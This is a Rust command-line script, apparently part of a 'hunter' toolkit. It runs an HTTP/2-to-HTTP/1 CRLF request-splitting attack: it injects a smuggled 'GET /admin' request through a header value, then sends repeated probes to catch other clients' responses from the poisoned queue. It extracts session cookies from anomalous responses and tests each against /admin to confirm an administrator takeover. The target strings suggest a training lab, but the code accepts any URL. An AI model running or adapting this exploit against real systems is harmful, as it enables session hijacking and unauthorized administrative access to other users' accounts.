#!/usr/bin/env rust-script
//! name: h2split_diag
//! description: H2->H1 CRLF-split diagnostic - arms the CRLF request split on an h2 connection (or per fresh connection in cycle mode), then paces probes and reports EVERY response row with decoded status, full header list, body length and body head, so it is decidable whether a foreign client's response (login 302 + Set-Cookie, authenticated page) ever lands on our streams; also reports distinct Set-Cookie values per status and the frame census.
//! version: 1.0.0
//! args: <base-url> [--mode sustain|cycle] [--path /] [--smuggle 'GET /admin HTTP/1.1'] [--hold-ms N] [--read-ms N] [--seconds N] [--probes N] [--verify-path /admin] [--out FILE] [--selftest]
//! keywords: hunter, h2, http2, crlf, request-splitting, response-queue-poisoning, diagnostic, hpack
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! rustls = { version = "0.23", default-features = false, features = ["ring", "logging", "std", "tls12"] }
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::client::TlsStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

const PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

#[derive(Default, Debug)]
struct Row {
    t_ms: u128,
    sid: u32,
    status: Option<String>,
    headers: Vec<(String, String)>,
    body_len: usize,
    body_head: String,
    frames: Vec<String>,
}

#[tokio::main]
async fn main() {
    let _ = rustls::crypto::ring::default_provider().install_default();
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let f = frame(0x4, 0x1, 3, b"abcd");
        let ok = f.len() == 13 && f[3] == 0x4 && inject_value("GET /admin HTTP/1.1", "lab.test").starts_with("\r\n\r\n");
        pi_rust_lib::report::success("h2split_diag", json!({"selftest": if ok {"ok"} else {"fail"}}), "run against the target").unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }

    let mut base = String::new();
    let mut mode = "sustain".to_string();
    let mut path = "/".to_string();
    let mut smuggle = "GET /admin HTTP/1.1".to_string();
    let mut hold_ms: u64 = 400;
    let mut read_ms: u64 = 1200;
    let mut seconds: f64 = 120.0;
    let mut probes: u32 = 0;
    let mut verify_path = "/admin".to_string();
    let mut out: Option<String> = None;
    let mut i = 0;
    while i < args.len() {
        let n = args.get(i + 1).cloned();
        match args[i].as_str() {
            "--mode" => { mode = n.unwrap_or(mode); i += 1; }
            "--path" => { path = n.unwrap_or(path); i += 1; }
            "--smuggle" => { smuggle = n.unwrap_or(smuggle); i += 1; }
            "--hold-ms" => { hold_ms = n.and_then(|v| v.parse().ok()).unwrap_or(hold_ms); i += 1; }
            "--read-ms" => { read_ms = n.and_then(|v| v.parse().ok()).unwrap_or(read_ms); i += 1; }
            "--seconds" => { seconds = n.and_then(|v| v.parse().ok()).unwrap_or(seconds); i += 1; }
            "--probes" => { probes = n.and_then(|v| v.parse().ok()).unwrap_or(probes); i += 1; }
            "--verify-path" => { verify_path = n.unwrap_or(verify_path); i += 1; }
            "--out" => { out = n; i += 1; }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure("h2split_diag", "missing base url", "h2split_diag <base-url> [--mode sustain|cycle]");
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = parsed.host_str().unwrap_or("").to_string();
    let port = parsed.port().unwrap_or(443);
    let inject = inject_value(&smuggle, &host);

    let r = run(&host, port, &mode, &path, &inject, hold_ms, read_ms, seconds, probes, &verify_path).await;
    match r {
        Ok(v) => {
            if let Some(p) = &out {
                let _ = std::fs::write(p, pi_rust_lib::serde_json::to_string_pretty(&v).unwrap_or_default());
            }
            pi_rust_lib::report::success("h2split_diag", v, "inspect anomalous rows / victim sessions").unwrap_or(());
        }
        Err(e) => {
            pi_rust_lib::report::failure("h2split_diag", &e, "check the base url / payload shape");
            std::process::exit(1);
        }
    }
}

fn inject_value(smuggle: &str, host: &str) -> String {
    format!("\r\n\r\n{smuggle}\r\nHost: {host}\r\n")
}

fn tls_config(alpn: &[&[u8]]) -> Arc<ClientConfig> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut cfg = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    cfg.alpn_protocols = alpn.iter().map(|p| p.to_vec()).collect();
    Arc::new(cfg)
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}

async fn h2_connect(cfg: Arc<ClientConfig>, host: &str, port: u16) -> Result<TlsStream<TcpStream>, String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))?;
    tls.write_all(PREFACE).await.map_err(|e| format!("preface: {e}"))?;
    tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(tls)
}

async fn send_request(
    tls: &mut TlsStream<TcpStream>,
    sid: u32,
    host: &str,
    path: &str,
    inject: Option<&str>,
) -> Result<(), String> {
    let mut headers: Vec<(Vec<u8>, Vec<u8>)> = vec![
        (b":method".to_vec(), b"GET".to_vec()),
        (b":scheme".to_vec(), b"https".to_vec()),
        (b":authority".to_vec(), host.as_bytes().to_vec()),
        (b":path".to_vec(), path.as_bytes().to_vec()),
        (b"user-agent".to_vec(), b"h2split-diag".to_vec()),
    ];
    if let Some(v) = inject {
        headers.push((b"x-arm".to_vec(), v.as_bytes().to_vec()));
    }
    let block = hpack::Encoder::new().encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
    tls.write_all(&frame(1, 0x5, sid, &block)).await.map_err(|e| format!("headers: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(())
}

async fn read_one(
    tls: &mut TlsStream<TcpStream>,
    dec: &mut hpack::Decoder<'_>,
    target: u32,
    read_ms: u64,
    t_ms: u128,
) -> Row {
    let mut row = Row { t_ms, sid: target, ..Default::default() };
    let mut ended = false;
    let idle = Duration::from_millis(read_ms.max(200));
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, tls.read_exact(&mut hdr)).await {
            Err(_) => break,
            Ok(Err(_)) => { row.frames.push("conn-closed".into()); break; }
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; len];
        if len > 0 && tokio::time::timeout(idle, tls.read_exact(&mut payload)).await.is_err() {
            break;
        }
        if sid == target || (ftype != 0 && ftype != 1 && ftype != 9 && ftype != 6 && ftype != 4) {
            row.frames.push(format!("t{ftype}/s{sid}/f{flags}/l{len}"));
        }
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = tls.flush().await;
                }
            }
            6 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(6, 0x1, 0, &payload)).await;
                    let _ = tls.flush().await;
                }
            }
            1 | 9 => {
                if let Ok(hs) = dec.decode(&payload) {
                    if sid == target {
                        for h in hs.iter() {
                            let name = String::from_utf8_lossy(&h.0).to_string();
                            let val = String::from_utf8_lossy(&h.1).to_string();
                            if name == ":status" {
                                row.status = Some(val.clone());
                            }
                            row.headers.push((name, val));
                        }
                    }
                }
                if sid == target && flags & 0x1 != 0 {
                    ended = true;
                }
            }
            0 => {
                if sid == target {
                    row.body_len += payload.len();
                    if row.body_head.len() < 400 {
                        row.body_head.push_str(&String::from_utf8_lossy(&payload));
                    }
                    if flags & 0x1 != 0 {
                        ended = true;
                    }
                }
            }
            3 => {
                if sid == target {
                    ended = true;
                }
            }
            _ => {}
        }
        if ended {
            break;
        }
    }
    row
}

fn sess(set_cookie: &str) -> Option<String> {
    let idx = set_cookie.find("session=")?;
    let mut out = String::new();
    for c in set_cookie[idx + 8..].chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
            out.push(c);
        } else {
            break;
        }
    }
    if out.is_empty() { None } else { Some(out) }
}

async fn http1_get(cfg: Arc<ClientConfig>, host: &str, port: u16, path: &str, cookie: Option<&str>) -> Result<(u16, String), String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("sn: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))?;
    let mut req = format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nAccept: */*\r\nConnection: close\r\n");
    if let Some(c) = cookie {
        req.push_str(&format!("Cookie: {c}\r\n"));
    }
    req.push_str("\r\n");
    tls.write_all(req.as_bytes()).await.map_err(|e| format!("write: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    let mut buf = Vec::new();
    let _ = tokio::time::timeout(Duration::from_secs(15), tls.read_to_end(&mut buf)).await;
    let text = String::from_utf8_lossy(&buf).to_string();
    let (head, body) = match text.split_once("\r\n\r\n") {
        Some((h, b)) => (h.to_string(), b.to_string()),
        None => (text.clone(), String::new()),
    };
    let status = head.lines().next().and_then(|l| l.split_whitespace().nth(1)).and_then(|s| s.parse::<u16>().ok()).unwrap_or(0);
    Ok((status, body))
}

#[allow(clippy::too_many_arguments)]
async fn run(
    host: &str,
    port: u16,
    mode: &str,
    path: &str,
    inject: &str,
    hold_ms: u64,
    read_ms: u64,
    seconds: f64,
    probes: u32,
    verify_path: &str,
) -> Result<Value, String> {
    let h2 = tls_config(&[b"h2"]);
    let h1 = tls_config(&[b"http/1.1"]);
    let start = Instant::now();
    let deadline = start + Duration::from_secs_f64(seconds);
    let mut rows: Vec<Row> = Vec::new();
    let mut conns = 0u32;
    let mut baseline_len: Option<usize> = None;

    if mode == "sustain" {
        let mut tls = h2_connect(h2.clone(), host, port).await?;
        let mut dec = hpack::Decoder::new();
        let mut sid = 1u32;
        send_request(&mut tls, sid, host, path, Some(inject)).await?;
        let arm = read_one(&mut tls, &mut dec, sid, read_ms, start.elapsed().as_millis()).await;
        if arm.status.as_deref() == Some("200") {
            baseline_len = Some(arm.body_len);
        }
        rows.push(arm);
        sid += 2;
        loop {
            if Instant::now() >= deadline {
                break;
            }
            tokio::time::sleep(Duration::from_millis(hold_ms)).await;
            if send_request(&mut tls, sid, host, path, None).await.is_err() {
                rows.push(Row { t_ms: start.elapsed().as_millis(), sid, frames: vec!["send-failed".into()], ..Default::default() });
                break;
            }
            let row = read_one(&mut tls, &mut dec, sid, read_ms, start.elapsed().as_millis()).await;
            let dead = row.status.is_none();
            rows.push(row);
            sid += 2;
            if dead {
                // fresh connection, re-arm
                conns += 1;
                if let Ok(mut t) = h2_connect(h2.clone(), host, port).await {
                    let mut d = hpack::Decoder::new();
                    let _ = send_request(&mut t, 1, host, path, Some(inject)).await;
                    let a = read_one(&mut t, &mut d, 1, read_ms, start.elapsed().as_millis()).await;
                    rows.push(a);
                    // keep using the new connection
                    tls = t;
                    dec = d;
                    sid = 3;
                } else {
                    break;
                }
            }
        }
        conns += 1;
    } else {
        // cycle: per round, arm on a fresh connection, close, then probe on fresh connections
        loop {
            if Instant::now() >= deadline {
                break;
            }
            let mut tls = h2_connect(h2.clone(), host, port).await?;
            let mut dec = hpack::Decoder::new();
            send_request(&mut tls, 1, host, path, Some(inject)).await?;
            let arm = read_one(&mut tls, &mut dec, 1, read_ms, start.elapsed().as_millis()).await;
            if arm.status.as_deref() == Some("200") && baseline_len.is_none() {
                baseline_len = Some(arm.body_len);
            }
            rows.push(arm);
            drop(tls);
            conns += 1;
            let n = if probes > 0 { probes } else { 5 };
            for _ in 0..n {
                if Instant::now() >= deadline {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(hold_ms)).await;
                let mut t = h2_connect(h2.clone(), host, port).await?;
                let mut d = hpack::Decoder::new();
                send_request(&mut t, 1, host, path, None).await?;
                let row = read_one(&mut t, &mut d, 1, read_ms, start.elapsed().as_millis()).await;
                rows.push(row);
                drop(t);
                conns += 1;
            }
        }
    }

    let bl = baseline_len.unwrap_or(0);
    let mut anomalous: Vec<Value> = Vec::new();
    let mut brief: Vec<Value> = Vec::new();
    let mut cookie_by_status: Vec<Value> = Vec::new();
    let mut candidate_sessions: Vec<String> = Vec::new();
    let mut status_hist: std::collections::BTreeMap<String, u32> = std::collections::BTreeMap::new();
    for r in rows.iter() {
        let st = r.status.clone().unwrap_or_else(|| "none".into());
        *status_hist.entry(st.clone()).or_insert(0) += 1;
        if brief.len() < 250 {
            brief.push(json!({
                "t_ms": r.t_ms,
                "status": r.status,
                "body_len": r.body_len,
                "set_cookie": r.headers.iter().filter(|(k, _)| k.eq_ignore_ascii_case("set-cookie")).map(|(_, v)| v.clone()).collect::<Vec<_>>(),
                "location": r.headers.iter().find(|(k, _)| k.eq_ignore_ascii_case("location")).map(|(_, v)| v.clone()),
                "body_head": r.body_head.chars().take(60).collect::<String>(),
            }));
        }
        let home = r.body_head.contains("Search the blog");
        let anom = st != "200" || (bl > 0 && r.body_len != bl) || !home;
        if anom {
            let sc: Vec<String> = r
                .headers
                .iter()
                .filter(|(k, _)| k.eq_ignore_ascii_case("set-cookie"))
                .map(|(_, v)| v.clone())
                .collect();
            let loc: Option<String> = r.headers.iter().find(|(k, _)| k.eq_ignore_ascii_case("location")).map(|(_, v)| v.clone());
            for c in sc.iter() {
                if let Some(v) = sess(c) {
                    if r.status.as_deref() != Some("401") && !candidate_sessions.contains(&v) {
                        candidate_sessions.push(v);
                    }
                }
            }
            if anomalous.len() < 60 {
                anomalous.push(json!({
                    "t_ms": r.t_ms, "sid": r.sid, "status": r.status, "location": loc,
                    "body_len": r.body_len, "body_head": r.body_head.chars().take(200).collect::<String>(),
                    "set_cookie": sc, "headers": r.headers.iter().map(|(k, v)| format!("{k}: {}", v.chars().take(80).collect::<String>())).collect::<Vec<_>>(),
                    "frames": r.frames,
                }));
            }
            if sc.len() > 0 && cookie_by_status.len() < 80 {
                cookie_by_status.push(json!({"t_ms": r.t_ms, "status": r.status, "body_len": r.body_len, "set_cookie": sc}));
            }
        }
    }

    // verify candidate sessions (from non-401 anomalous responses)
    let mut verified: Option<Value> = None;
    let mut tested = 0u32;
    for v in candidate_sessions.iter().take(40) {
        tested += 1;
        if let Ok((st, body)) = http1_get(h1.clone(), host, port, verify_path, Some(&format!("session={v}"))).await {
            if st == 200 && !body.contains("only available if logged in as an administrator") { // binding-exempt: candidate battery value: generic privilege-role probe, not a lab user
                verified = Some(json!({"session": v, "status": st, "head": body.chars().take(300).collect::<String>()}));
                break;
            }
        }
    }

    Ok(json!({
        "host": host,
        "mode": mode,
        "inject": inject,
        "baseline_len": bl,
        "connections": conns,
        "rows": rows.len(),
        "status_hist": status_hist,
        "anomalous_count": anomalous.len(),
        "anomalous": anomalous,
        "brief": brief,
        "cookie_by_status": cookie_by_status,
        "candidate_sessions": candidate_sessions,
        "candidates_tested": tested,
        "verified": verified,
    }))
}
